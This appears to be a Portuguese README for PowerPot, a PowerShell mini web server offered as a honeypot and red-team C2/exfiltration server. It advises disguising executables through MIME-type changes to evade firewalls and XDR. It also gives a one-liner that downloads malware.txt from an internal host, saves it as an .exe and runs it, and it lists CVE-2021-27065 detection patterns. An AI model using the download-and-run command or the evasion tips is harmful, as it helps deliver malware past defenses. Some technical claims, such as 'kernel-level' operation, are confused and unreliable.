# 🌐 PowerPot 🍯

## Introdução

Esta documentação descreve o **PowerPot**, uma ferramenta multitarefas, um mini servidor web desenvolvido para testes de segurança e simulações de ataques. A proposta do PowerPot é fornecer um ambiente controlado para coletar dados de payloads, atuar como um honeypot e servir como uma plataforma para a proliferação de malwares em ambientes de teste para equipes de Red Team.

## Proposta do Projeto

O PowerPot tem os seguintes objetivos principais:

1. **Ambiente de Testes Web**: Facilitar a criação de um ambiente onde profissionais de segurança podem interagir com diferentes tipos de requisições HTTP, permitindo a observação de como atacantes podem explorar falhas em um servidor web.

2. **Honeypot**: Servir como um honeypot que atrai potenciais atacantes, possibilitando o monitoramento e registro de suas ações. Isso ajuda as equipes de segurança a compreender táticas e técnicas utilizadas por atacantes.

3. **Coleta de Dados**: Capturar informações detalhadas sobre cada interação, incluindo métodos de requisição, payloads enviados e dados do cliente, que podem ser analisados para entender comportamentos maliciosos.

4. **Ferramentas leve para RedTeam**: Fácilmente configurável para transformar em uma ferramenta versátil de Exfiltration e C2.

### Funcionalidade de Honeypot

Um honeypot é um serviço intencionalmente configurado para ser exposto, com o objetivo de coletar o máximo de informações sobre tentativas de ataques ou requisições suspeitas, encontrando facilmente o ofensor. 
O PowerPot é projetado para registrar:

- **Endereço IP de Origem**: Captura o endereço IP do cliente que faz a requisição, permitindo a análise da geolocalização dos atacantes e suas fontes.

- **Método HTTP Utilizado**: Registra o método da requisição (GET, POST, PUT, DELETE), permitindo uma análise de como os atacantes interagem com o servidor.

- **URL Requisitada**: Armazena a URL acessada, incluindo qualquer parâmetro de consulta, permitindo que a equipe de segurança compreenda quais recursos estão sendo alvo.

- **User-Agent**: Identifica o agente do usuário que fez a requisição, ajudando a discernir se o acesso foi feito por um script automatizado ou um navegador.

- **Tamanho do Payload**: Captura o tamanho do payload enviado, se houver, ajudando a entender o volume de dados que os atacantes tentam enviar ao servidor.

- **Esconde o Server Hearder**: Um detalhe é a não exibição do Server Header ou Host Header, fazendo com que um possível atacante fique confuso ao fazer o reconhecimento.
 
- **Registro de log**: Todos os metadas da transação web ficam registrados no log que você forneceu o caminho, o máximo de dados obtidos do cliente ficam registrados lá.

### Log de Payloads

Todos os detalhes de cada requisição são registrados em um arquivo de log. As informações logadas incluem:

- **Data e Hora**: Um timestamp é gerado para cada requisição, facilitando a auditoria e a análise de eventos.

- **Detalhes do Cliente**: Informações como IP, nome do computador e sistema operacional do cliente que fez a requisição são registradas para análise posterior.

- **Conteúdo do Payload**: O conteúdo enviado pelo cliente é registrado quando aplicável, o que é crucial para entender como os malwares tentam interagir com o servidor.

- **Futura implementação**: Emulação de servidor FTP, capturando novamente os payloads e registrando as informações em logs.

## Operação em nível de Kernel do Windows

O PowerPot é implementado em PowerShell, mas ele carrega a assembly `http.sys`, permitindo que opere dentro do kernel do Windows *System.exe*. A execução no nível do sistema oferece vantagens significativas, incluindo:

- **Desempenho**: A interação próxima com o sistema operacional garante que o servidor funcione de maneira eficiente, usa poucos recursos, suportando múltiplas conexões e requisições simultâneas.

- **Capacidade de Monitoramento**: A implementação em PowerShell permite que o servidor monitore e registre as atividades do sistema, coletando dados em tempo real que são valiosos para a análise de segurança.

- **Bypass**: Por rodar em powershell, muitos sistemas de segurança por conformidade, precisam ignorar "Falsos alertas" pois o powershell é utilizado em massa por sistemas em geral para updates e automações de manutenções.

### Função de C2 (Command and Control)

O servidor pode ser configurado para simular uma infraestrutura de C2, onde malwares podem se comunicar para receber comandos ou exfiltrar dados. Isso permite que as equipes de Red Team:

- **Testem a Comunicação de Malwares**: Testem com facilidade Exfiltration, Command and Control Server, use sua criatividade para obfuscar.

- **Analisem o Comportamento de Ofensores**: Capturam de onde requisições estão originando, quais requisições são maliciosas, permitindo um entendimento mais profundo de suas operações.

- **Compreendam a Configuração de C2**: Ajudam as equipes de segurança a implementar medidas defensivas contra sistemas de C2, tentando replicar casos ou mesmo criando novos métodos e estando à frente em cibersegurança.

- **Alteração de MIMETYPE**: O script é legível a parte onde ele manipula os MIMETYPES, você pode mudar um arquivo .exe para `text/html`, tentando burlar firewall de camada 7 alterando o `Content Type` de resposta do servidor web, assim podendo burlar algum firewall que tenham brechas em suas regras.

- **Alteração de Portas**: Podemos rapidamente alterar *as portas* e a *pasta de execução*, para executar operações de Exfiltration de arquivos usando portas liberadas para comunicação, bem como uma torre de liberação de payloads binários, alterando os tipo de MIME para tentar burlar soluções XDR ou firewalls de camada 7, Exemplo para rodar em clientes: `iwr "http://servidor.local/malware.txt" -OutF "$env:LOCALAPPDATA\temp\malware.exe" & Start-Process "$env:LOCALAPPDATA\temp\malware.exe"`

Explicação do comando:
````
iwr = invoke-webrequest
http://servidor.local/malware.txt = servidor interno, com o .exe alterado para .txt
-OutF = -OutFile
"$env:LOCALAPPDATA\temp\malware.exe" = pasta temp do usuário que está rodando a sessão, arquivo salvo com a extensão correta.
Start-Process "$env:LOCALAPPDATA\temp\malware.exe" = Execução do Arquivo logo em seguida.
````

### Requisitos

- **.Net FrameWork 4.5 ou .Net Core 2.1**

- **PowerShell 5.1+**

- **Windows 7+**

### Implementação

O PowerPot é criado utilizando a classe `System.Net.HttpListener`, que é uma classe do .NET Framework que permite criar um servidor web de forma simples e leve.
Ele roda em nível de kernel, tendo a opção de abstrair os métodos que fecham os listener, deixando eles persistente mesmo fechando o powershell.

#### Principais Componentes:

1. **Escuta de Portas**: O servidor escuta uma porta específica, recebendo requisições HTTP de qualquer cliente que se conecte a ele.

2. **Manipulação de Requisições**: Ele é capaz de processar requisições GET, POST e PUT, diferenciando cada tipo de requisição para registrar os detalhes adequadamente.

3. **Registro de Logs**: O sistema de logging registra todas as requisições em um arquivo de log, garantindo que as informações valiosas não sejam perdidas.

### Estrutura do Log

Os logs gerados pelo PowerPot são estruturados para permitir fácil análise. Cada entrada de log inclui informações como:

- **Timestamp**: Data e hora da requisição.
- **IP do Cliente**: O endereço IP que fez a requisição.
- **Método HTTP**: O método utilizado na requisição (GET, POST, etc.).
- **URL**: A URL que foi acessada.
- **User-Agent**: O agente do usuário que fez a requisição.
- **Tamanho do Payload**: O tamanho do payload enviado, se aplicável.


 ## Sobre Parâmetros
 ````
# Caminho padrão para o diretório
-DirectoryPath
Tipo [string]
Valor padrão = "C:\inetpub\wwwroot"

# Caminho padrão para o arquivo de log
-LogFilePath
Tipo [string]
Valor Padrão = "C:\inetpub\logs\LogFiles\powerpot.log"

# Porta padrão
-Port
Tipo [int]
Valor Padrão = 8080

# Ativar a detecção de payloads maliciosos no log, mude o valor para $true para ativar detecção de payloads maliciosos no log
-MaliciousDetection = $false
Tipo [bool]
Valor Padrão = $false  

# Caminho para o arquivo txt de payloads maliciosos que serão detectados
-MaliciousPayloadsFile
Tipo [string]
Valor Padrão = ""
# Caso o parâmetro -MaliciousDetection seja ativado, esse parâmetro é obrigatório, informe o caminho para o arquivo txt de payloads maliciosos, nenhum caminho padrão está configurado nele.
````
## Instruções de Uso

Para executar o script `powerpot.ps1`, siga estas etapas:

1. **Abra o PowerShell** com permissões administrativas.
2. **Navegue até o diretório** onde o script está localizado. Por exemplo:
   ```powershell
   cd C:\caminho\para\o\script
3. **No Powershell 5.1+**
   ```powershell
   Powerpot.ps1 -DirectoryPath "C:\fake\website\path" -LogFilePath "C:\log\path\honeypot.log" -Port 8080
4. Caso não selecionado, os diretórios padrão serão `Web Site C:\inetpub\wwwroot\`, `Path para os log C:\inetpub\logs\LogFiles`, `Porta de comunicação :8080`
5. Exemplo de uso avançado, com detecção de payloads:
      ```powershell
   Powerpot.ps1 -DirectoryPath "C:\fake\website\path" -LogFilePath "C:\log\path\honeypot.log" -Port 8080 -MaliciousDetection = $true -MaliciousPayloadsFile "C:\log\path\iismaliciousquery.txt"
6. Lembre que as consultas maliciosas são sua responsabilidade de mantê-las atualizadas, três exemplos de requisições maliciosas feitas no CVE 2021-27065 seguem abaixo:
````
Exemplos: 
/ecp/ResetVirtualDirectory
Set-.+VirtualDirectory.+?(?=Url).+<\w+.*>(.*?)<\/\w+>.+?(?=VirtualDirectory)
lsass*.dmp
````
7. Sempre pesquise em centros de cibersegurança como cve.mitre.org e exploit-db.com, identifique se o payload é uma consulta simples à um web server e adicione no maliciousquery.txt, pronto.
   
## Conclusão

O PowerPot oferece uma ferramenta leve para testes de segurança e análise de proliferação de malwares. Suas funcionalidades como honeypot e a capacidade de operar no kernel do Windows fazem dele um recurso valioso, com capacidade de fazer bypass em ferramentas de segurança pois não tenta obfuscar o inicio do listener, após iniciado, ficará rodando como system.exe, sem a lógica do "do-while" iniciando o listener direto, ele só resetaria o serviço se reiniciar o S.O., para equipes de segurança que buscam entender melhor as ameaças analisando logs com mais claresa e simplicidade, podendo entender ameaças a web servers sem expor servidores com dados sensíveis, também agir proativamente em detecção interna e externa de ofensores tomando ações para mitigar os ofensores, testes de C2 ou pentesters em geral.

### Nota

**Este servidor deve ser utilizado apenas em ambientes de teste controlados. O uso indevido pode violar leis e políticas de segurança. O seu criador não é responsável pelo mau uso ou danos causados.**
